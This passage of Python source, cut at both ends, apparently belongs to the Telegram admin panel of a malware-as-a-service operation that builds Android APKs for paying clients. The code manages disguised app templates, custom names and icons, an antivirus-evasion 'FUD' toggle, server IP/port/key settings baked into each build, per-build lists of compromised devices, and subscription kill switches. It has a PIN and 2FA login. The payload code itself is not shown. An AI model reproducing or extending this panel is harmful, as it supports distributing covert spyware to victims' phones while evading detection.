        log.warning(
            f"Wrong PIN during valid session — "
            f"invalidating session for {chat_id}"
        )
        invalidate_session(chat_id)

    return count


def record_totp_fail(chat_id: int) -> int:
    """Record failed 2FA attempt. Returns fail count."""
    cid              = str(chat_id)
    _failed_totp[cid] = _failed_totp.get(cid, 0) + 1
    count            = _failed_totp[cid]

    if count >= MAX_TOTP_FAILS:
        _lockout_until[cid] = time.time() + LOCKOUT_MINUTES * 60
        _failed_totp[cid]   = 0
        log.warning(
            f"TOTP lockout triggered for {chat_id}")
        send_telegram_alert(
            f"🔐 <b>2FA Lockout</b>\n"
            f"Admin bot: {MAX_TOTP_FAILS} wrong 2FA attempts.\n"
            f"Locked for {LOCKOUT_MINUTES} minutes."
        )
    return count


def clear_fails(chat_id: int):
    """Clear fail counters on successful login."""
    cid = str(chat_id)
    _failed_pins.pop(cid, None)
    _failed_totp.pop(cid, None)
    _lockout_until.pop(cid, None)


# ── Layer 6: Auto cleanup thread ─────────────────────────────────────────────

def cleanup_sessions():
    """
    Layer 6: Remove expired sessions from memory + file.
    Runs every 30 minutes in background thread.
    """
    now     = time.time()
    expired = [cid for cid, exp in _verified.items()
               if exp <= now]
    if expired:
        for cid in expired:
            _verified.pop(cid, None)
        _save_session_file()
        log.info(
            f"Session cleanup: removed "
            f"{len(expired)} expired session(s)"
        )


def session_cleanup_loop():
    """Background thread for Layer 6 auto cleanup."""
    while True:
        try:
            time.sleep(1800)  # every 30 min
            cleanup_sessions()
        except Exception as e:
            log.warning(f"Session cleanup error: {e}")


# ── TOTP verification ─────────────────────────────────────────────────────────

def verify_totp(code: str) -> bool:
    try:
        return pyotp.TOTP(
            config.TOTP_SECRET).verify(code, valid_window=1)
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 7 — KEYBOARD BUILDERS
# ═══════════════════════════════════════════════════════════════════════════════

def kb_pin() -> types.InlineKeyboardMarkup:
    # No numpad — PIN entered as plain text in chat
    kb = types.InlineKeyboardMarkup(row_width=1)
    return kb


def kb_main() -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("👥 Clients",  callback_data="nav_clients"),
        types.InlineKeyboardButton("🏗 Build",    callback_data="nav_build"),
    )
    kb.add(
        types.InlineKeyboardButton("🖥 Server",   callback_data="nav_server"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="nav_settings"),
    )
    return kb


def kb_clients(clients: list) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton(
        "➕ Add Client", callback_data="add_client"))
    for c in clients:
        name   = c["profile_name"] or c["telegram_username"]
        status = "🟢" if c["active"] else "🔴"
        kb.add(types.InlineKeyboardButton(
            f"{status} {name}",
            callback_data=f"client_{c['id']}"
        ))
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="nav_home"))
    return kb


def kb_client_detail(client_id: int, active: bool = True, vpn_bypass: int = 1,
                     killed: int = 0, expire_ts: int = 0) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=1)

    # ── BUILD SECTION ─────────────────────────────────────────────────────────
    kb.add(types.InlineKeyboardButton(
        "🏗 New Build",        callback_data=f"new_build_{client_id}"))
    kb.add(types.InlineKeyboardButton(
        "📋 Builds History",   callback_data=f"builds_history_{client_id}"))

    # ── LICENSE SECTION ───────────────────────────────────────────────────────
    # Expire display — human-readable
    if expire_ts and expire_ts > 0:
        exp_str = datetime.fromtimestamp(expire_ts, tz=timezone.utc).strftime("%d %b %Y")
        kb.add(types.InlineKeyboardButton(
            f"⏰ Expires: {exp_str}",  callback_data=f"set_expire_{client_id}"))
    else:
        kb.add(types.InlineKeyboardButton(
            "⏰ Set Expiry",           callback_data=f"set_expire_{client_id}"))
    # Renew — extend subscription by 30 days
    kb.add(types.InlineKeyboardButton(
        "🔑 Renew (+30 days)",         callback_data=f"renew_license_{client_id}"))
    # Kill APK toggle
    if killed:
        kb.add(types.InlineKeyboardButton(
            "✅ Revive APK",            callback_data=f"kill_apk_{client_id}"))
    else:
        kb.add(types.InlineKeyboardButton(
            "💀 Kill APK",              callback_data=f"kill_apk_{client_id}"))

    # ── STATUS SECTION ────────────────────────────────────────────────────────
    kb.add(types.InlineKeyboardButton(
        "📊 Stats",            callback_data=f"client_stats_{client_id}"))

    # ── CONFIG SECTION ────────────────────────────────────────────────────────
    # FUD toggle
    if vpn_bypass:
        kb.add(types.InlineKeyboardButton(
            "🔴 FUD: ON  → Turn OFF", callback_data=f"toggle_fud_{client_id}"))
    else:
        kb.add(types.InlineKeyboardButton(
            "🟢 FUD: OFF → Turn ON",  callback_data=f"toggle_fud_{client_id}"))
    kb.add(types.InlineKeyboardButton(
        "✏️ Edit Client",      callback_data=f"edit_client_{client_id}"))

    # ── NAVIGATION ────────────────────────────────────────────────────────────
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="nav_clients"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )

    # ── DANGER ZONE ───────────────────────────────────────────────────────────
    if active:
        kb.add(types.InlineKeyboardButton(
            "🔴 Deactivate",   callback_data=f"toggle_client_{client_id}"))
    else:
        kb.add(types.InlineKeyboardButton(
            "🟢 Activate",     callback_data=f"toggle_client_{client_id}"))
    kb.add(types.InlineKeyboardButton(
        "🗑 Delete Client",    callback_data=f"delete_client_{client_id}"))

    return kb


def kb_edit_client_menu(client_id: int) -> types.InlineKeyboardMarkup:
    """Pick which field to edit."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "👤 Edit Profile Name",    callback_data=f"editfield_{client_id}_name"))
    kb.add(types.InlineKeyboardButton(
        "🔗 Edit Username",        callback_data=f"editfield_{client_id}_username"))
    kb.add(types.InlineKeyboardButton(
        "🆔 Edit Telegram ID",     callback_data=f"editfield_{client_id}_tg_id"))
    kb.add(types.InlineKeyboardButton(
        "🖥 Edit RDP IP",          callback_data=f"editfield_{client_id}_rdp_ip"))
    kb.add(types.InlineKeyboardButton(
        "🔙 Back",                 callback_data=f"client_{client_id}"))
    return kb


def kb_template_select(client_id: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    for key, (emoji, name) in TEMPLATES.items():
        kb.add(types.InlineKeyboardButton(
            f"{emoji} {name}",
            callback_data=f"template_{client_id}_{key}"
        ))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"client_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_rebuild_confirm(client_id: int, template: str) -> types.InlineKeyboardMarkup:
    """Pre-filled rebuild confirm screen keyboard."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "✅ Confirm Rebuild",
        callback_data=f"rebuild_confirm_{client_id}_{template}"))
    kb.add(types.InlineKeyboardButton(
        "✏️ Change Config",
        callback_data=f"rebuild_edit_{client_id}_{template}"))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"template_action_back_{client_id}_{template}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_quick_rebuild_confirm(client_id: int, template: str) -> types.InlineKeyboardMarkup:
    """Rebuild confirm keyboard for quick_rebuild_ flow (launched from APK doc buttons).
    Back → client detail (not template action — there is no template screen in this flow).
    """
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "✅ Confirm Rebuild",
        callback_data=f"rebuild_confirm_{client_id}_{template}"))
    kb.add(types.InlineKeyboardButton(
        "✏️ Change Config",
        callback_data=f"rebuild_edit_{client_id}_{template}"))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"client_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_template_action(client_id: int, template: str) -> types.InlineKeyboardMarkup:
    """Action screen shown after tapping a template — New Build or Rebuild Last."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "🏗 New Build",    callback_data=f"template_new_{client_id}_{template}"))
    kb.add(types.InlineKeyboardButton(
        "🔁 Rebuild Last", callback_data=f"template_rebuild_{client_id}_{template}"))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"new_build_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_build_confirm(client_id: int,
                     template: str) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "✅ Confirm & Build",
        callback_data=f"confirm_build_{client_id}_{template}"
    ))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back",
            callback_data=f"new_build_{client_id}"
        ),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_build_result(client_id: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton(
            "🏗 New Build",
            callback_data=f"new_build_{client_id}"
        ),
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"client_{client_id}"),
    )
    kb.add(types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"))
    return kb


def kb_builds_history(builds: list,
                      client_id: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    for b in builds:
        emoji, _ = TEMPLATES.get(b["template"], ("⚙️", b["template"]))
        status   = "✅" if b["status"] == "success" else "❌"
        kb.add(types.InlineKeyboardButton(
            f"#{b['build_number']} {emoji} {status}",
            callback_data=f"build_detail_{b['id']}"
        ))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"client_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_build_detail(build_id: int, client_id: int,
                    fud_override: int = -1) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton(
            "📱 Devices",
            callback_data=f"devices_{build_id}_1"
        ),
        types.InlineKeyboardButton(
            "🔁 Rebuild",
            callback_data=f"rebuild_{build_id}"
        ),
    )
    # FUD toggle: show current build-level override state
    if fud_override == 1:
        fud_label = "🛡 FUD: ON (this build)"
    elif fud_override == 0:
        fud_label = "🚫 FUD: OFF (this build)"
    else:
        fud_label = "🛡 FUD: Inherit (toggle)"
    kb.add(types.InlineKeyboardButton(
        fud_label, callback_data=f"toggle_build_fud_{build_id}"))
    kb.add(types.InlineKeyboardButton(
        "📥 Get APK", callback_data=f"get_apk_{build_id}"))
    kb.add(types.InlineKeyboardButton(
        "🗑 Delete Build", callback_data=f"delete_build_confirm_{build_id}_{client_id}"))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back",
            callback_data=f"builds_history_{client_id}"
        ),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_devices(build_id: int, page: int, total_pages: int,
               devices: list = None) -> types.InlineKeyboardMarkup:
    kb    = types.InlineKeyboardMarkup(row_width=3)
    prev  = page - 1 if page > 1 else page
    nxt   = page + 1 if page < total_pages else page
    kb.add(
        types.InlineKeyboardButton(
            "◀️ Prev", callback_data=f"devices_{build_id}_{prev}"),
        types.InlineKeyboardButton(
            f"{page}/{total_pages}", callback_data="noop"),
        types.InlineKeyboardButton(
            "▶️ Next", callback_data=f"devices_{build_id}_{nxt}"),
    )
    # Per-device detail buttons (one per device on this page)
    if devices:
        for d in devices:
            mfr      = d.get("manufacturer") or ""
            model    = d.get("model") or ""
            dev_name = " ".join(filter(None, [mfr, model])) or d['device_id'][:10]
            dev_fud  = d.get("fud_override", -1)
            if dev_fud is None:
                dev_fud = -1
            fud_icon = "🛡" if int(dev_fud) == 1 else ("🚫" if int(dev_fud) == 0 else "📋")
            kb.add(types.InlineKeyboardButton(
                f"{fud_icon} {dev_name[:22]}",
                callback_data=f"device_detail_{d['id']}"
            ))
    kb.add(types.InlineKeyboardButton(
        "🔍 Search", callback_data=f"search_devices_{build_id}"))
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"build_detail_{build_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def kb_home_only() -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"))
    return kb


def kb_back_home() -> types.InlineKeyboardMarkup:
    """Single Back button that returns to Home — used for leaf pages with no deeper parent."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="nav_home"))
    return kb


def kb_server() -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("🔄 Refresh",    callback_data="nav_server"),
        types.InlineKeyboardButton("📋 View Logs",  callback_data="server_logs"),
    )
    kb.add(
        types.InlineKeyboardButton("♻️ Restart Bot", callback_data="server_restart"),
        types.InlineKeyboardButton("🔗 Tunnel URL",  callback_data="server_tunnel"),
    )
    kb.add(types.InlineKeyboardButton(
        "⬇️ Force Sync from GitHub", callback_data="server_force_sync"))
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="nav_home"))
    return kb


def kb_settings() -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "🔐 Change PIN",        callback_data="settings_change_pin"))
    kb.add(types.InlineKeyboardButton(
        "🔑 Change 2FA Secret", callback_data="settings_change_2fa"))
    kb.add(types.InlineKeyboardButton(
        "🔙 Back",              callback_data="nav_home"))
    return kb


def kb_build() -> types.InlineKeyboardMarkup:
    """Build menu — back to home only (dev/deploy pipeline removed)."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "🔙 Back",                 callback_data="nav_home"))
    return kb




def kb_delete_confirm(client_id: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton(
            "✅ Yes, Delete",
            callback_data=f"confirm_delete_{client_id}"
        ),
        types.InlineKeyboardButton(
            "❌ Cancel",
            callback_data=f"client_{client_id}"
        ),
    )
    return kb


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 8 — MESSAGE TEXT BUILDERS
# ═══════════════════════════════════════════════════════════════════════════════

def text_pin(buf: str = "") -> str:
    return (
        "🔐 <b>Secure Login</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Type your PIN and send it.\n"
        "<i>Your message will be deleted automatically.</i>"
    )


def text_2fa() -> str:
    return (
        "🔐 <b>2FA Verification</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "PIN ✅ Verified\n\n"
        "Enter 6-digit code from 2FAS app\n"
        "and send it as a message."
    )


def text_main(chat_id: int) -> str:
    remaining = session_remaining(chat_id)
    bot_ok  = "✅ Running" if check_service_running("vaultguard_telegram")   else "🔴 Stopped"
    cf_ok   = "✅ Active"  if check_service_running("vaultguard_cloudflare") else "🔴 Stopped"
    wdog_ok = "✅ Running" if check_service_running("vaultguard_mutation")   else "🔴 Stopped"
    return (
        "👋 <b>Welcome, Admin</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🖥 Bot       : {bot_ok}\n"
        f"🔗 Tunnel    : {cf_ok}\n"
        f"♻️ Watchdog  : {wdog_ok}\n"
        f"🕐 UTC       : {utc_now()}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🔒 Session   : {remaining} remaining"
    )


def text_clients(clients: list) -> str:
    total  = len(clients)
    active = sum(1 for c in clients if c["active"])
    lines  = [
        "👥 <b>Clients</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Total : {total}  |  Active : {active}",
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    if not clients:
        lines.append("No clients yet.\nTap ➕ Add Client to get started.")
    else:
        for i, c in enumerate(clients, 1):
            name   = c["profile_name"] or c["telegram_username"]
            status = "🟢" if c["active"] else "🔴"
            lines.append(f"{i}. {status} {name}")
    return "\n".join(lines)


def text_client_detail(c: dict) -> str:
    db          = get_db()
    builds      = db.execute(
        "SELECT COUNT(*) as cnt FROM builds WHERE client_id=?",
        (c["id"],)).fetchone()["cnt"]
    devices     = db.execute(
        "SELECT COUNT(*) as cnt FROM devices WHERE client_id=?",
        (c["id"],)).fetchone()["cnt"]
    last_build  = db.execute(
        "SELECT build_number, status, template FROM builds "
        "WHERE client_id=? ORDER BY id DESC LIMIT 1",
        (c["id"],)).fetchone()
    db.close()

    name = c["profile_name"] or c["telegram_username"]
    last = "—"
    if last_build:
        emoji, _ = TEMPLATES.get(last_build["template"], ("⚙️", ""))
        st       = "✅" if last_build["status"] == "success" else "❌"
        last     = f"#{last_build['build_number']} {st} {emoji}"

    fud_label    = "🟢 ON" if c.get("vpn_bypass", 1) else "🔴 OFF"
    username_line = f"@{c['telegram_username']}" if c['telegram_username'] else "—"
    profile_line  = c['profile_name'] if c['profile_name'] else "—"

    # License status
    killed    = int(c.get("killed", 0) or 0)
    expire_ts = int(c.get("expire_ts", 0) or 0)
    grace_hrs = int(c.get("grace_hours", 72) or 72)
    now_ts    = int(time.time())
    if killed:
        license_line = "💀 KILLED"
    elif expire_ts == 0:
        license_line = "♾️ No expiry"
    elif expire_ts < now_ts:
        days_over = (now_ts - expire_ts) // 86400
        license_line = f"⚠️ Expired ({days_over}d ago — grace {grace_hrs}h)"
    else:
        days_left = (expire_ts - now_ts) // 86400
        exp_str   = datetime.fromtimestamp(expire_ts, tz=timezone.utc).strftime("%d %b %Y")
        license_line = f"✅ Active — {exp_str} ({days_left}d left)"

    return (
        f"👤 <b>{name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Status      : {'🟢 Active' if c['active'] else '🔴 Inactive'}\n"
        f"License     : {license_line}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Profile     : {profile_line}\n"
        f"Username    : {username_line}\n"
        f"Telegram ID : <code>{c['telegram_id']}</code>\n"
        f"RDP IP      : <code>{c['rdp_ip']}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"FUD         : {fud_label}\n"
        f"Builds      : {builds}\n"
        f"Devices     : {devices}\n"
        f"Last Build  : {last}\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )


def text_template_select(client_id: int) -> str:
    db   = get_db()
    c    = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
    return (
        f"🏗 <b>New Build — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Select app template:"
    )


def text_rebuild_confirm(client_id: int, template: str) -> str:
    """Pre-filled server config screen for Rebuild Last."""
    db = get_db()
    c  = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    last_build = db.execute(
        "SELECT build_number, status, server_ip, server_port, server_key FROM builds "
        "WHERE client_id=? AND template=? "
        "ORDER BY id DESC LIMIT 1",
        (client_id, template)
    ).fetchone()
    db.close()
    name   = c["profile_name"] or c["telegram_username"] if c else "Unknown"
    rdp_ip = c["rdp_ip"] if c else "—"
    emoji, tpl_name = TEMPLATES.get(template, ("⚙️", template.title()))
    if last_build:
        ip   = last_build["server_ip"]   or rdp_ip
        port = last_build["server_port"] or "—"
        key  = last_build["server_key"]  or "—"
        build_ref = f"#{last_build['build_number']}"
        st = "✅" if last_build["status"] == "success" else "❌"
    else:
        ip   = rdp_ip
        port = "—"
        key  = "—"
        build_ref = "None"
        st = ""
    return (
        f"🔁 <b>Rebuild Last — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Template    : {emoji} {tpl_name}\n"
        f"🔖 Last build  : {build_ref} {st}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 Server IP   : <code>{ip}</code>\n"
        f"🔌 Port        : <code>{port}</code>\n"
        f"🔑 Key         : <code>{key[:4] + '••••' if key and key != '—' else key}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Confirm to rebuild with this config:"
    )


def _get_custom_build_history(client_id: int, limit: int = 5):
    """Return last N distinct custom builds for a client (by custom_app_name)."""
    db = get_db()
    rows = db.execute(
        "SELECT id, build_number, status, custom_app_name, custom_icon_fid, "
        "server_ip, server_port, server_key "
        "FROM builds "
        "WHERE client_id=? AND template='custom' AND custom_app_name != '' "
        "ORDER BY id DESC LIMIT ?",
        (client_id, limit)
    ).fetchall()
    db.close()
    return rows


def text_custom_history(client_id: int, history: list) -> str:
    db = get_db()
    c  = db.execute("SELECT profile_name, telegram_username FROM clients WHERE id=?",
                    (client_id,)).fetchone()
    db.close()
    name = (c["profile_name"] or c["telegram_username"]) if c else str(client_id)
    lines = [
        f"⚙️ <b>Custom Builds — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Previous custom builds:\n"
    ]
    for i, row in enumerate(history, 1):
        st = "✅" if row["status"] == "success" else "❌"
        bn = f"#{row['build_number']}" if row["build_number"] else "—"
        lines.append(f"{i}. {row['custom_app_name']}    — Build {bn} {st}")
    lines.append("\nSelect to rebuild or start a new one:")
    return "\n".join(lines)


def kb_custom_history(client_id: int, history: list) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=1)
    for row in history:
        kb.add(types.InlineKeyboardButton(
            f"🔁 {row['custom_app_name']}",
            callback_data=f"custom_rebuild_{client_id}_{row['id']}"
        ))
    kb.add(types.InlineKeyboardButton(
        "🏗 New Custom Build",
        callback_data=f"custom_new_{client_id}"
    ))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data=f"new_build_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def text_custom_rebuild_confirm(client_id: int, build_row) -> str:
    db = get_db()
    c  = db.execute("SELECT profile_name, telegram_username FROM clients WHERE id=?",
                    (client_id,)).fetchone()
    db.close()
    name = (c["profile_name"] or c["telegram_username"]) if c else str(client_id)
    app  = build_row["custom_app_name"]
    ip   = build_row["server_ip"]   or "—"
    port = build_row["server_port"] or "—"
    key  = build_row["server_key"]  or "—"
    key_disp = (key[:4] + "••••") if key and key != "—" else key
    bn   = f"#{build_row['build_number']}" if build_row["build_number"] else "—"
    st   = "✅" if build_row["status"] == "success" else "❌"
    return (
        f"🔁 <b>Rebuild Custom — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 App          : {app}\n"
        f"🔖 Last build   : {bn} {st}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 Server IP    : <code>{ip}</code>\n"
        f"🔌 Port         : <code>{port}</code>\n"
        f"🔑 Key          : <code>{key_disp}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Confirm to rebuild with this config:"
    )


def kb_custom_rebuild_confirm(client_id: int, build_id: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(
        "✅ Confirm Rebuild",
        callback_data=f"custom_rebuild_confirm_{client_id}_{build_id}"
    ))
    kb.add(types.InlineKeyboardButton(
        "✏️ Change Config",
        callback_data=f"custom_rebuild_edit_{client_id}_{build_id}"
    ))
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data=f"custom_history_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


def text_template_action(client_id: int, template: str) -> str:
    db = get_db()
    c  = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    last_build = db.execute(
        "SELECT build_number, status, template FROM builds "
        "WHERE client_id=? AND template=? ORDER BY id DESC LIMIT 1",
        (client_id, template)
    ).fetchone()
    db.close()
    name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
    emoji, tpl_name = TEMPLATES.get(template, ("⚙️", template.title()))
    last_line = ""
    if last_build:
        st = "✅" if last_build["status"] == "success" else "❌"
        last_line = f"\n🔁 Last build  : #{last_build['build_number']} {st}"
    else:
        last_line = "\n🔁 Last build  : None"
    return (
        f"{emoji} <b>{tpl_name} — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Template    : {tpl_name}"
        f"{last_line}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Choose action:"
    )


def text_build_confirm(client_id: int, template: str,
                       srv_ip: str = "", srv_port: str = "",
                       srv_key: str = "") -> str:
    import random
    emoji, display_name = TEMPLATES.get(template, ("⚙️", template.title()))
    version             = (f"{random.randint(1,9)}."
                           f"{random.randint(0,9)}."
                           f"{random.randint(0,99)}")
    srv_line = ""
    if srv_ip:
        srv_line = (
            f"📡 Server   : {srv_ip}:{srv_port}\n"
            f"🔑 Key      : {srv_key}\n"
        )
    return (
        f"{emoji} <b>{display_name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 App Name  : {display_name}\n"
        f"📦 Package   : auto-generated\n"
        f"🔢 Version   : {version}\n"
        f"🔐 Signing   : android@android.com\n"
        f"🛡 Protection: All layers enabled\n"
        + srv_line +
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Everything correct?"
    )


def text_custom_name_prompt(client_id: int) -> str:
    db = get_db()
    c  = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
    return (
        f"⚙️ <b>Custom Build — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📛 Enter app name:\n\n"
        "<i>Example: Bike Tracker, Photo Editor, etc.</i>"
    )


def text_custom_icon_prompt(app_name: str) -> str:
    return (
        f"⚙️ <b>Custom Build</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 App Name: {app_name}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🖼 Upload app icon:\n\n"
        "<i>Send any image (JPG, PNG, WEBP…) — auto-converted to 512×512 PNG</i>"
    )


def text_custom_build_confirm(client_id: int, app_name: str,
                              srv_ip: str = "", srv_port: str = "",
                              srv_key: str = "") -> str:
    import random
    version = (f"{random.randint(1,9)}."
               f"{random.randint(0,9)}."
               f"{random.randint(0,99)}")
    srv_line = ""
    if srv_ip:
        srv_line = (
            f"📡 Server   : {srv_ip}:{srv_port}\n"
            f"🔑 Key      : {srv_key}\n"
        )
    return (
        f"⚙️ <b>{app_name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 App Name  : {app_name}\n"
        f"📦 Package   : auto-generated\n"
        f"🔢 Version   : {version}\n"
        f"🔐 Signing   : android@android.com\n"
        f"🛡 Protection: All layers enabled\n"
        f"🖼 Icon      : ✅ Uploaded\n"
        + srv_line +
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Everything correct?"
    )


def kb_custom_cancel(client_id: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"new_build_{client_id}"),
        types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
    )
    return kb


# ── Server config helpers (IP / Domain / Port / Key) ────────────────────────

def is_domain(val: str) -> bool:
    """Return True if val looks like a domain name (not an IPv4 address)."""
    import re as _re
    if not val:
        return False
    if _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', val):
        return False
    return bool(_re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', val))


def text_server_host_type_prompt(client_id: int, template: str,
                                  cfg: dict = None) -> str:
    """Host type selection screen — shown before IP/Domain input."""
    db = get_db()
    c  = db.execute(
        "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
    db.close()
    name = c["profile_name"] or c["telegram_username"] if c else "Unknown"
    emoji, tpl_name = TEMPLATES.get(template, ("⚙️", template.title()))
    if cfg is None:
        cfg = read_companion_server_config()
    if cfg["ip"] or cfg["port"] or cfg["key"]:
        current_line = (
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📌 <b>Current in companion:</b>\n"
            f"   {'🌐 Domain' if is_domain(cfg['ip']) else '📡 IP    '} : <code>{cfg['ip']   or '—'}</code>\n"
            f"   🔌 Port   : <code>{cfg['port'] or '—'}</code>\n"
            f"   🔑 Key    : <code>{cfg['key']  or '—'}</code>\n"
        )
    else:
        current_line = ""
    return (
        f"🌐 <b>Server Config — {name}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"Template: {emoji} {tpl_name}\n"
        + current_line +
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🖥 <b>Select host type:</b>"
    )


def kb_server_host_type(client_id: int,
                         template: str) -> types.InlineKeyboardMarkup:
    """Host type selection keyboard — IP Address or Domain Name."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton(
            "📡 IP Address",
            callback_data=f"srv_host_ip_{client_id}_{template}"),
        types.InlineKeyboardButton(
            "🌐 Domain Name",
            callback_data=f"srv_host_domain_{client_id}_{template}"),
        types.InlineKeyboardButton(
            "🔙 Back", callback_data=f"new_build_{client_id}"),
        types.InlineKeyboardButton(
            "🏠 Home", callback_data="nav_home"),
    )
    return kb


def text_server_domain_prompt(cfg: dict = None) -> str:
    """Domain input screen — asks admin to type No-IP domain."""
    return (
        "🌐 <b>Server Config</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🌐 <b>Domain Name</b>\n"
